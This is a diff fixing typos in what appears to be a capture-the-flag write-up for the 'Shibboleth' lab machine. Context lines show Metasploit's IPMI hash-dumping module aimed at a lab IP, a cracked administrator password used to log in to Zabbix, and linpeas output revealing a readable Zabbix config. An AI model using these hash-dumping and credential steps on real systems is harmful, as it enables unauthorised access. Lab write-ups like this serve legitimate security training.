@@ -84,7 +84,7 @@ There's also a metasploit module for dumping password hashes using this vulnerab
 
 ![](screenshots/module-info.png)
 
-Dump some passowrd hash 
+Dump some password hash 
 ```bash
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.10.11.124
@@ -106,7 +106,7 @@ dumped hashes output in the `hash.cat` file and directly load in hashcat
 
 Creds: `Administrator:ilovepumkinpie1`
 
-And successfully loged in to zabbix(`zabbix.shibboleth.htb`) with found creds.
+And successfully logged in to zabbix(`zabbix.shibboleth.htb`) with found creds.
 
 ![](screenshots/zabbix-loged-iin.png)
 
@@ -231,7 +231,7 @@ ipmi-svc@shibboleth:~$ ss -lntp | grep 127
 LISTEN  0        869            127.0.0.1:3306           0.0.0.0:*
 ```
 
-linpeas show zabbix config file is reabable by "ipmi-svc"
+linpeas show zabbix config file is readable by "ipmi-svc"
 ```bash
 ╔══════════╣ Readable files belonging to root and readable by me but not world readable
 -rw-r----- 1 root ipmi-svc 22306 Oct 18 09:24 /etc/zabbix/zabbix_server.conf.dpkg-dist
